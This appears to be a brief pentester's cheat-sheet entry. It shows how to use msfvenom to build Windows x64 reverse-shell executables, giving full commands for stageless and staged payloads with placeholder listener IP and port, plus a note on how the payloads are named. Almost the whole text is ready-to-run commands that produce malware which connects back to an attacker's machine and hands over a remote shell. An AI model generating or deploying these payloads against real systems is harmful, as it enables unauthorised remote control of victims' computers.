Generate a Windows x64 Reverse Shell in an exe format

stageless payload
 ```bash
msfvenom -p windows/x64/shell_reverse_tcp -f exe -o stageless-shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```

As staged payloads have other forward slash (/).
```bash
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```

The exception to slash (/) convention is on Windows 32bit targets where the arch is not specified. e.g.:
```bash
windows/shell_reverse_tcp
```

